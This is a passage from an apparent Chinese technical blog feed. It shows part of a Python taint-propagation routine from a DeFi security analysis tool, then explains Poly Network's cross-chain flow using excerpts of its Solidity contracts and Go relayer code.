<span class="comment"># log.info(pp2)</span></span><br><span class="line">                   <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">               <span class="keyword">else</span>:</span><br><span class="line">                   pending.append(pp)</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>下面介绍一下tainted source污点传播的过程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">transfer</span>(<span class="params">self, pp</span>):</span><br><span class="line">    <span class="comment"># log.info(pp)</span></span><br><span class="line">    next_pps = []</span><br><span class="line">    <span class="comment"># log.info(pp[&quot;caller_funcSign&quot;])</span></span><br><span class="line">    parent_contract = self.find_parent(</span><br><span class="line">        pp[<span class="string">&quot;contract_addr&quot;</span>], pp[<span class="string">&quot;func_sign&quot;</span>], pp[<span class="string">&quot;caller&quot;</span>], pp[<span class="string">&quot;callsite&quot;</span>]</span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># 找到调用该合约的合约</span></span><br><span class="line">    <span class="comment"># log.info(parent_contract.logic_addr)</span></span><br><span class="line">    <span class="comment"># log.info(parent_contract.caller)</span></span><br><span class="line">    <span class="comment"># log.info(parent_contract.func_sign)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        child_contract = self.find_contract(</span><br><span class="line">            pp[<span class="string">&quot;caller&quot;</span>],</span><br><span class="line">            pp[<span class="string">&quot;callsite&quot;</span>],</span><br><span class="line">            pp[<span class="string">&quot;contract_addr&quot;</span>],</span><br><span class="line">            pp[<span class="string">&quot;func_sign&quot;</span>],</span><br><span class="line">            pp[<span class="string">&quot;caller_funcSign&quot;</span>],</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># log.info(child_contract.logic_addr)</span></span><br><span class="line">        <span class="comment"># log.info(child_contract.caller)</span></span><br><span class="line">        <span class="comment"># log.info(child_contract.func_sign)</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> next_pps</span><br><span class="line"></span><br><span class="line">    <span class="comment"># apply spread transfer for func_ret and call_arg, respectively</span></span><br><span class="line">    <span class="comment">## 如果污点传播的方式是通过函数的返回值</span></span><br><span class="line">    <span class="comment">## 查看该函数作为调用返回值，能够传播到的函数返回值和调用参数</span></span><br><span class="line">    <span class="keyword">if</span> pp[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;func_ret&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> parent_contract <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            indexes = self.spread_callRet_funcRet(</span><br><span class="line">                pp[<span class="string">&quot;caller&quot;</span>], pp[<span class="string">&quot;callsite&quot;</span>], parent_contract.func_sign, pp[<span class="string">&quot;index&quot;</span>]</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">for</span> index <span class="keyword">in</span> indexes:</span><br><span class="line">                next_pps.append(</span><br><span class="line">                    self.new_pp(</span><br><span class="line">                        parent_contract.caller,</span><br><span class="line">                        parent_contract.call_site,</span><br><span class="line">                        parent_contract.logic_addr,</span><br><span class="line">                        parent_contract.func_sign,</span><br><span class="line">                        index,</span><br><span class="line">                        pp[<span class="string">&quot;caller_funcSign&quot;</span>],</span><br><span class="line">                        <span class="string">&quot;func_ret&quot;</span>,</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        callArgs = self.spread_callRet_CallArg(</span><br><span class="line">            pp[<span class="string">&quot;contract_addr&quot;</span>], pp[<span class="string">&quot;callsite&quot;</span>], pp[<span class="string">&quot;index&quot;</span>]</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">for</span> callArg <span class="keyword">in</span> callArgs:</span><br><span class="line">            (</span><br><span class="line">                temp_caller,</span><br><span class="line">                temp_logic_addr,</span><br><span class="line">                temp_func_sign,</span><br><span class="line">            ) = self.get_external_call_info(</span><br><span class="line">                callArg[<span class="string">&quot;callStmt&quot;</span>], child_contract.external_calls</span><br><span class="line">            )</span><br><span class="line">            next_pps.append(</span><br><span class="line">                self.new_pp(</span><br><span class="line">                    temp_caller,</span><br><span class="line">                    callArg[<span class="string">&quot;callStmt&quot;</span>],</span><br><span class="line">                    temp_logic_addr,</span><br><span class="line">                    <span class="comment"># temp func sign is the called function that lies in the attacker contract</span></span><br><span class="line">                    temp_func_sign,</span><br><span class="line">                    callArg[<span class="string">&quot;callArgIndex&quot;</span>],</span><br><span class="line">                    <span class="comment"># pp[func_sign] is the function that calls back to attacker contract</span></span><br><span class="line">                    pp[<span class="string">&quot;func_sign&quot;</span>],</span><br><span class="line">                    <span class="string">&quot;call_arg&quot;</span>,</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">            <span class="comment"># log.info(next_pps)</span></span><br><span class="line">	<span class="comment"># 如果污点的传播方式是通过调用参数</span></span><br><span class="line">    <span class="comment"># 查看在被调用合约中的，通过函数参数传播到的调用参数，被调用对象，以及函数返回值</span></span><br><span class="line">    <span class="keyword">if</span> pp[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;call_arg&quot;</span>:</span><br><span class="line">        callArgs = []</span><br><span class="line">        <span class="comment"># function arg to call arg and callee var</span></span><br><span class="line">        callArgs += self.spread_funcArg_callArg(</span><br><span class="line">            pp[<span class="string">&quot;contract_addr&quot;</span>], pp[<span class="string">&quot;func_sign&quot;</span>], pp[<span class="string">&quot;index&quot;</span>]</span><br><span class="line">        )</span><br><span class="line">        callArgs += self.spread_funcArg_callee(</span><br><span class="line">            pp[<span class="string">&quot;contract_addr&quot;</span>], pp[<span class="string">&quot;func_sign&quot;</span>], pp[<span class="string">&quot;index&quot;</span>]</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> callArg <span class="keyword">in</span> callArgs:</span><br><span class="line">            temp_result = self.get_external_call_info(</span><br><span class="line">                callArg[<span class="string">&quot;callStmt&quot;</span>], child_contract.external_calls</span><br><span class="line">            )</span><br><span class="line">            <span class="comment"># log.info(temp_result)</span></span><br><span class="line">            <span class="keyword">if</span> temp_result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                temp_caller, temp_logic_addr, temp_func_sign = temp_result</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            next_pps.append(</span><br><span class="line">                self.new_pp(</span><br><span class="line">                    pp[<span class="string">&quot;contract_addr&quot;</span>],</span><br><span class="line">                    callArg[<span class="string">&quot;callStmt&quot;</span>],</span><br><span class="line">                    temp_logic_addr,</span><br><span class="line">                    temp_func_sign,</span><br><span class="line">                    callArg[<span class="string">&quot;callArgIndex&quot;</span>],</span><br><span class="line">                    pp[<span class="string">&quot;func_sign&quot;</span>],</span><br><span class="line">                    <span class="string">&quot;call_arg&quot;</span>,</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">            <span class="comment"># log.info(next_pps)</span></span><br><span class="line">        <span class="comment"># the return index of the function call</span></span><br><span class="line">        indexes = self.spread_funcArg_funcRet(</span><br><span class="line">            pp[<span class="string">&quot;contract_addr&quot;</span>], pp[<span class="string">&quot;func_sign&quot;</span>], pp[<span class="string">&quot;index&quot;</span>]</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> indexes:</span><br><span class="line">            next_pps.append(</span><br><span class="line">                self.new_pp(</span><br><span class="line">                    pp[<span class="string">&quot;caller&quot;</span>],</span><br><span class="line">                    pp[<span class="string">&quot;callsite&quot;</span>],</span><br><span class="line">                    pp[<span class="string">&quot;contract_addr&quot;</span>],</span><br><span class="line">                    pp[<span class="string">&quot;func_sign&quot;</span>],</span><br><span class="line">                    index,</span><br><span class="line">                    pp[<span class="string">&quot;caller_funcSign&quot;</span>],</span><br><span class="line">                    <span class="string">&quot;func_ret&quot;</span>,</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">    <span class="keyword">return</span> next_pps</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Defi安全</category>
      </categories>
      <tags>
        <tag>Defi安全</tag>
        <tag>工具源码学习</tag>
      </tags>
  </entry>
  <entry>
    <title>PolyNetwork跨链流程</title>
    <url>/2023/12/16/PolyNetwork%E8%B7%A8%E9%93%BE%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Poly-Network跨链流程"><a href="#Poly-Network跨链流程" class="headerlink" title="Poly Network跨链流程"></a>Poly Network跨链流程</h1><h3 id="源链"><a href="#源链" class="headerlink" title="源链"></a>源链</h3><p>用户发起跨链交易，调用逻辑合约中的lock()函数</p>
<p>eth_contracts\contracts\core\lock_proxy\LockProxy.sol</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* @notice                  This function is meant to be invoked by the user,</span><br><span class="line">*                           a certin amount teokens will be locked in the proxy contract the invoker/msg.sender immediately.</span><br><span class="line">*                           Then the same amount of tokens will be unloked from target chain proxy contract at the target chain with chainId later.</span><br><span class="line">*  @param fromAssetHash     The asset address in current chain, uniformly named as `fromAssetHash`</span><br><span class="line">*  @param toChainId         The target chain id</span><br><span class="line">*                           </span><br><span class="line">*  @param toAddress         The address in bytes format to receive same amount of tokens in target chain </span><br><span class="line">*  @param amount            The amount of tokens to be crossed from ethereum to the chain with chainId</span><br><span class="line">*/</span><br><span class="line">function lock(address fromAssetHash, uint64 toChainId, bytes memory toAddress, uint256 amount) public payable returns (bool) &#123;</span><br><span class="line">    require(amount != 0, &quot;amount cannot be zero!&quot;);</span><br><span class="line">    </span><br><span class="line">    //将代币合约地址锁到代理合约之中</span><br><span class="line">    require(_transferToContract(fromAssetHash, amount), &quot;transfer asset from fromAddress to lock_proxy contract  failed!&quot;);</span><br><span class="line">    </span><br><span class="line">    bytes memory toAssetHash = assetHashMap[fromAssetHash][toChainId];</span><br><span class="line">    require(toAssetHash.length != 0, &quot;empty illegal toAssetHash&quot;);</span><br><span class="line"></span><br><span class="line">    TxArgs memory txArgs = TxArgs(&#123;</span><br><span class="line">        toAssetHash: toAssetHash,</span><br><span class="line">        toAddress: toAddress,</span><br><span class="line">        amount: amount</span><br><span class="line">    &#125;);</span><br><span class="line">    bytes memory txData = _serializeTxArgs(txArgs);</span><br><span class="line">    </span><br><span class="line">    IEthCrossChainManagerProxy eccmp = IEthCrossChainManagerProxy(managerProxyContract);</span><br><span class="line">    address eccmAddr = eccmp.getEthCrossChainManager();</span><br><span class="line">    IEthCrossChainManager eccm = IEthCrossChainManager(eccmAddr);</span><br><span class="line">    </span><br><span class="line">    bytes memory toProxyHash = proxyHashMap[toChainId];</span><br><span class="line">    require(toProxyHash.length != 0, &quot;empty illegal toProxyHash&quot;);</span><br><span class="line">    require(eccm.crossChain(toChainId, toProxyHash, &quot;unlock&quot;, txData), &quot;EthCrossChainManager crossChain executed error!&quot;);</span><br><span class="line"></span><br><span class="line">    emit LockEvent(fromAssetHash, _msgSender(), toChainId, toAssetHash, toAddress, amount);</span><br><span class="line">    </span><br><span class="line">    return true;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>lock()函数中会调用CCM跨链管理合约中的crossChain()函数，并emit对应LockEvent。</p>
<p>eth_contracts\contracts\core\cross_chain_manager\logic\EthCrossChainManager.sol</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function crossChain(uint64 toChainId, bytes calldata toContract, bytes calldata method, bytes calldata txData) whenNotPaused external returns (bool) &#123;</span><br><span class="line">    // Only allow whitelist contract to call</span><br><span class="line">    require(whiteListFromContract[msg.sender],&quot;Invalid from contract&quot;);</span><br><span class="line">    </span><br><span class="line">    // Load Ethereum cross chain data contract</span><br><span class="line">    IEthCrossChainData eccd = IEthCrossChainData(EthCrossChainDataAddress);</span><br><span class="line">    </span><br><span class="line">    // To help differentiate two txs, the ethTxHashIndex is increasing automatically</span><br><span class="line">    uint256 txHashIndex = eccd.getEthTxHashIndex();</span><br><span class="line">    </span><br><span class="line">    // Convert the uint256 into bytes</span><br><span class="line">    bytes memory paramTxHash = Utils.uint256ToBytes(txHashIndex);</span><br><span class="line">    </span><br><span class="line">    // Construct the makeTxParam, and put the hash info storage, to help provide proof of tx existence</span><br><span class="line">    bytes memory rawParam = abi.encodePacked(ZeroCopySink.WriteVarBytes(paramTxHash),</span><br><span class="line">        ZeroCopySink.WriteVarBytes(abi.encodePacked(sha256(abi.encodePacked(address(this), paramTxHash)))),</span><br><span class="line">        ZeroCopySink.WriteVarBytes(Utils.addressToBytes(msg.sender)),</span><br><span class="line">        ZeroCopySink.WriteUint64(toChainId),</span><br><span class="line">        ZeroCopySink.WriteVarBytes(toContract),</span><br><span class="line">        ZeroCopySink.WriteVarBytes(method),</span><br><span class="line">        ZeroCopySink.WriteVarBytes(txData)</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    // Must save it in the storage to be included in the proof to be verified.</span><br><span class="line">    require(eccd.putEthTxHash(keccak256(rawParam)), &quot;Save ethTxHash by index to Data contract failed!&quot;);</span><br><span class="line">    </span><br><span class="line">    // Fire the cross chain event denoting there is a cross chain request from Ethereum network to other public chains through Poly chain network</span><br><span class="line">    emit CrossChainEvent(tx.origin, paramTxHash, msg.sender, toChainId, toContract, rawParam);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>crossChain()函数构造对应的跨链函数的交易信息，并且emit对应的跨链事件。</p>
<h3 id="Relayer"><a href="#Relayer" class="headerlink" title="Relayer"></a>Relayer</h3><h4 id="Txlisten"><a href="#Txlisten" class="headerlink" title="Txlisten"></a>Txlisten</h4><p><strong>从源链获取跨链交易消息的数据，并将其放入消息队列中</strong></p>
<p>对应的abi接口将监听对应的跨链事件,将对应的跨链事件存储到对应的迭代器中。</p>
<p>eth_contracts\go_abi\eccm_abi\eccm_abi.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// FilterCrossChainEvent is a free log retrieval operation binding the contract event 0x6ad3bf15c1988bc04bc153490cab16db8efb9a3990215bf1c64ea6e28be88483.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Solidity: event CrossChainEvent(address indexed sender, bytes txId, address proxyOrAssetContract, uint64 toChainId, bytes toContract, bytes rawdata)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(_EthCrossChainManager *EthCrossChainManagerFilterer)</span></span> FilterCrossChainEvent(opts *bind.FilterOpts, sender []common.Address) (*EthCrossChainManagerCrossChainEventIterator, <span class="type">error</span>) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> senderRule []<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> _, senderItem := <span class="keyword">range</span> sender &#123;</span><br><span class="line">		senderRule = <span class="built_in">append</span>(senderRule, senderItem)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	logs, sub, err := _EthCrossChainManager.contract.FilterLogs(opts, <span class="string">&quot;CrossChainEvent&quot;</span>, senderRule)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> &amp;EthCrossChainManagerCrossChainEventIterator&#123;contract: _EthCrossChainManager.contract, event: <span class="string">&quot;CrossChainEvent&quot;</span>, logs: logs, sub: sub&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>relayer中的scan()函数将查找在区块中的跨链交易，构造交易数据，并且调用compose()函数进一步构造交易数据</p>
<p>poly-relayer/relayer/eth/listener.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *Listener)</span></span> Scan(height <span class="type">uint64</span>) (txs []*msg.Tx, err <span class="type">error</span>) &#123;</span><br><span class="line">	ccm, err := eccm_abi.NewEthCrossChainManager(l.ccm, l.sdk.Node())</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	opt := &amp;bind.FilterOpts&#123;</span><br><span class="line">		Start:   height,</span><br><span class="line">		End:     &amp;height,</span><br><span class="line">		Context: context.Background(),</span><br><span class="line">	&#125;</span><br><span class="line">	events, err := ccm.FilterCrossChainEvent(opt, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> events == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	txs = []*msg.Tx&#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> events.Next() &#123;</span><br><span class="line">		ev := events.Event</span><br><span class="line">		param := &amp;ccom.MakeTxParam&#123;&#125;</span><br><span class="line">		err = param.Deserialization(pcom.NewZeroCopySource([]<span class="type">byte</span>(ev.Rawdata)))</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		tx := &amp;msg.Tx&#123;</span><br><span class="line">			TxType:     msg.SRC,</span><br><span class="line">			TxId:       msg.EncodeTxId(ev.TxId),</span><br><span class="line">			SrcHash:    ev.Raw.TxHash.String(),</span><br><span class="line">			DstChainId: ev.ToChainId,</span><br><span class="line">			SrcHeight:  height,</span><br><span class="line">			SrcParam:   hex.EncodeToString(ev.Rawdata),</span><br><span class="line">			SrcChainId: l.config.ChainId,</span><br><span class="line">			SrcProxy:   ev.ProxyOrAssetContract.String(),</span><br><span class="line">			DstProxy:   common.BytesToAddress(ev.ToContract).String(),</span><br><span class="line">			SrcAddress: ev.Sender.String(),</span><br><span class="line">		&#125;</span><br><span class="line">		l.Compose(tx)</span><br><span class="line">		txs = <span class="built_in">append</span>(txs, tx)</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// FilterCrossChainEvent is a free log retrieval operation binding the contract event 0x6ad3bf15c1988bc04bc153490cab16db8efb9a3990215bf1c64ea6e28be88483.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Solidity: event CrossChainEvent(address indexed sender, bytes txId, address proxyOrAssetContract, uint64 toChainId, bytes toContract, bytes rawdata)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(_EthCrossChainManager *EthCrossChainManagerFilterer)</span></span> FilterCrossChainEvent(opts *bind.FilterOpts, sender []common.Address) (*EthCrossChainManagerCrossChainEventIterator, <span class="type">error</span>) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> senderRule []<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> _, senderItem := <span class="keyword">range</span> sender &#123;</span><br><span class="line">		senderRule = <span class="built_in">append</span>(senderRule, senderItem)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	logs, sub, err := _EthCrossChainManager.contract.FilterLogs(opts, <span class="string">&quot;CrossChainEvent&quot;</span>, senderRule)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> &amp;EthCrossChainManagerCrossChainEventIterator&#123;contract: _EthCrossChainManager.contract, event: <span class="string">&quot;CrossChainEvent&quot;</span>, logs: logs, sub: sub&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>compose()函数对构造跨链交易的参数进行检查，构造一些数据，调用GetProof()得到对应的交易证明</p>
<p>poly-relayer/relayer/eth/listener.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *Listener)</span></span> Compose(tx *msg.Tx) (err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(tx.SrcProofHex) &gt; <span class="number">0</span> &amp;&amp; tx.Param != <span class="literal">nil</span> &#123; <span class="comment">// Already fetched the proof</span></span><br><span class="line">		log.Info(<span class="string">&quot;Proof already fetched for tx&quot;</span>, <span class="string">&quot;hash&quot;</span>, tx.SrcHash)</span><br><span class="line">		tx.SrcProof, _ = hex.DecodeString(tx.SrcProofHex)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> tx.SrcHeight == <span class="number">0</span> || <span class="built_in">len</span>(tx.TxId) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;tx missing attributes src height %v, txid %s&quot;</span>, tx.SrcHeight, tx.TxId)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(tx.SrcParam) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;src param is missing&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	event, err := hex.DecodeString(tx.SrcParam)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%s submitter decode src param error %v event %s&quot;</span>, l.name, err, tx.SrcParam)</span><br><span class="line">	&#125;</span><br><span class="line">	txId, err := hex.DecodeString(tx.TxId)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%s failed to decode src txid %s, err %v&quot;</span>, l.name, tx.TxId, err)</span><br><span class="line">	&#125;</span><br><span class="line">	param := &amp;ccom.MakeTxParam&#123;&#125;</span><br><span class="line">	err = param.Deserialization(pcom.NewZeroCopySource(event))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	tx.Param = param</span><br><span class="line">	tx.SrcEvent = event</span><br><span class="line">	tx.SrcProofHeight, tx.SrcProof, err = l.GetProof(txId, tx.SrcHeight)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>getproof()通过对应rpc接口获取以太坊上对应的交易证明</p>
<p>poly-relayer/relayer/eth/listener.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *Listener)</span></span> getProof(txId []<span class="type">byte</span>, txHeight <span class="type">uint64</span>) (height <span class="type">uint64</span>, proof []<span class="type">byte</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">	id := msg.EncodeTxId(txId)</span><br><span class="line">	bytes, err := ceth.MappingKeyAt(id, <span class="string">&quot;01&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		err = fmt.Errorf(<span class="string">&quot;%s scan event mapping key error %v&quot;</span>, l.name, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	proofKey := hexutil.Encode(bytes)</span><br><span class="line">	height, err = l.GetProofHeight(txHeight)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		err = fmt.Errorf(<span class="string">&quot;%s can height get proof height error %v&quot;</span>, l.name, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> txHeight &gt; height &#123;</span><br><span class="line">		err = fmt.Errorf(<span class="string">&quot;%w Proof not ready tx height %v proof height %v&quot;</span>, msg.ERR_PROOF_UNAVAILABLE, txHeight, height)</span><br><span class="line">		<span class="comment">// We dont return here, still fetch the proof with tx height</span></span><br><span class="line">		height = txHeight</span><br><span class="line">	&#125;</span><br><span class="line">	ethProof, e := l.sdk.Node().GetProof(l.ccd.String(), proofKey, height)</span><br><span class="line">	<span class="keyword">if</span> e != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> height, <span class="literal">nil</span>, e</span><br><span class="line">	&#125;</span><br><span class="line">	proof, e = json.Marshal(ethProof)</span><br><span class="line">	<span class="keyword">if</span> e != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> height, <span class="literal">nil</span>, e</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Client)</span></span> GetProof(addr <span class="type">string</span>, key <span class="type">string</span>, height <span class="type">uint64</span>) (proof *ETHProof, err <span class="type">error</span>) &#123;</span><br><span class="line">	heightHex := hexutil.EncodeBig(big.NewInt(<span class="type">int64</span>(height)))</span><br><span class="line">	proof = &amp;ETHProof&#123;&#125;</span><br><span class="line">	err = c.Rpc.CallContext(context.Background(), &amp;proof, <span class="string">&quot;eth_getProof&quot;</span>, addr, []<span class="type">string</span>&#123;key&#125;, heightHex)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在构造完对应的跨链交易结构之后，relayer构造一个Redis数据库，存储消息队列，将对应的跨链交易存到对应的队列中。</p>
<p>poly-relayer/bus/sort.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> SortedTxBus <span class="keyword">interface</span> &#123;</span><br><span class="line">	Push(context.Context, *msg.Tx, <span class="type">uint64</span>) <span class="type">error</span></span><br><span class="line">	Range(context.Context, <span class="type">uint64</span>, <span class="type">int64</span>) ([]*msg.Tx, <span class="type">error</span>)</span><br><span class="line">	Pop(context.Context) (*msg.Tx, <span class="type">uint64</span>, <span class="type">error</span>)</span><br><span class="line">	Len(context.Context) (<span class="type">uint64</span>, <span class="type">error</span>)</span><br><span class="line">	Topic() <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *RedisSortedTxBus)</span></span> Push(ctx context.Context, msg *msg.Tx, height <span class="type">uint64</span>) (err <span class="type">error</span>) &#123;</span><br><span class="line">	_, err = b.db.ZAdd(ctx, b.Key.Key(),</span><br><span class="line">		&amp;redis.Z&#123;</span><br><span class="line">			Score:  <span class="type">float64</span>(height),</span><br><span class="line">			Member: msg.Encode(),</span><br><span class="line">		&#125;,</span><br><span class="line">	).Result()</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *RedisSortedTxBus)</span></span> Pop(ctx context.Context) (tx *msg.Tx, score <span class="type">uint64</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">	res, err := b.db.BZPopMin(ctx, <span class="number">0</span>, b.Key.Key()).Result()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> res == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	score = <span class="type">uint64</span>(res.Score)</span><br><span class="line">	tx = <span class="built_in">new</span>(msg.Tx)</span><br><span class="line">	err = tx.Decode(res.Member.(<span class="type">string</span>))</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Txcommit"><a href="#Txcommit" class="headerlink" title="Txcommit"></a>Txcommit</h4><p>遍历对应的跨链交易信息队列，将跨链交易提交给Poly Chain。</p>
<p>relayer随后启动poly submitter worker，调用pop()函数将对应的跨链交易信息从队列中取出，随后调用对应的submit()函数，将对应的跨链交易信息传递到poly chain上。</p>
<p>poly-relayer/relayer/poly/poly.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Submitter)</span></span> Start(ctx context.Context, wg *sync.WaitGroup, mq bus.SortedTxBus, composer msg.SrcComposer) <span class="type">error</span> &#123;</span><br><span class="line">	s.composer = composer</span><br><span class="line">	s.Context = ctx</span><br><span class="line">	s.wg = wg</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> s.config.Procs == <span class="number">0</span> &#123;</span><br><span class="line">		s.config.Procs = <span class="number">1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; s.config.Procs; i++ &#123;</span><br><span class="line">		log.Info(<span class="string">&quot;Starting poly submitter worker&quot;</span>, <span class="string">&quot;index&quot;</span>, i, <span class="string">&quot;procs&quot;</span>, s.config.Procs, <span class="string">&quot;chain&quot;</span>, s.name, <span class="string">&quot;topic&quot;</span>, mq.Topic())</span><br><span class="line">		<span class="keyword">go</span> s.consume(mq)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 